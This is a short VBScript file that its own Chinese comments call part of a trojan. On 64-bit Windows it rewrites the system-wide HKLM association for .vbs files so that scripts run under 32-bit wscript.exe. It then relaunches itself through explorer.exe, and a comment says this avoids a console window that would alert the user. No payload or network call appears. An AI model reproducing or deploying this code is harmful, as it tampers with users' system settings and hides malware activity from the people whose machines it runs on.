Const DEFAULT_VBS_OPEN_COMMAND_KEY =	"HKLM\SOFTWARE\Classes\vbsfile\shell\open\command\"
Const CUSTOM_VBS_OPEN_COMMAND_VALUE =	"""%SystemRoot%\SysWow64\wscript.exe"" ""%1"" %*"

Call Main()

Sub Main() '主函数，强制程序以32位WScript.exe解释执行
	If X86orX64() = "X64" Then
		If ReadReg(DEFAULT_VBS_OPEN_COMMAND_KEY) <> CUSTOM_VBS_OPEN_COMMAND_VALUE Then
			WScript.Echo("Using WScript.exe 64")
			Call SetVbsFileAss()	'改变vbs格式文件关联
			Call ReopenVbsHorse()	'重新启动木马
			Exit Sub
		End If
	End If
	
	WScript.Echo("Using WScript.exe 32")
	
End Sub

Function X86orX64() '判断是X86架构还是X64架构
	Dim objFileSystem
	Set objFileSystem = wscript.createobject("scripting.filesystemobject")
	X86orX64 = "X86"
	systemRootPath = objFileSystem.GetSpecialFolder(0) & "\" 
	If objFileSystem.folderexists(systemRootPath & "SysWow64") Then
		X86orX64 = "X64"
	End if
End Function

Sub ReopenVbsHorse()
	Dim objShell
	Set objShell = CreateObject("WScript.Shell")
	objShell.Run("explorer.exe " & WScript.ScriptFullName) '不使用CMD打开，防止产生黑框被用户发觉
	Set objShell = Nothing
End Sub

Sub SetVbsFileAss() '改变vbs格式文件关联
	Key = DEFAULT_VBS_OPEN_COMMAND_KEY
	Value = CUSTOM_VBS_OPEN_COMMAND_VALUE
	Call WriteReg(Key, Value, "REG_EXPAND_SZ")
End Sub

Sub WriteReg(key, value, typeName) '写注册表
	Dim objShell
	Set objShell = CreateObject("WScript.Shell")
	If typeName = "" Then
		objShell.RegWrite key, value
	Else
		objShell.RegWrite key, value, typeName
	End If
	Set objShell = Nothing
End Sub

Function ReadReg(key) '读取注册表，搜索key，返回所在路径
	Dim objShell
	Set objShell = CreateObject("WScript.Shell")
	ReadReg = objShell.RegRead(key)
	Set objShell = Nothing
End Function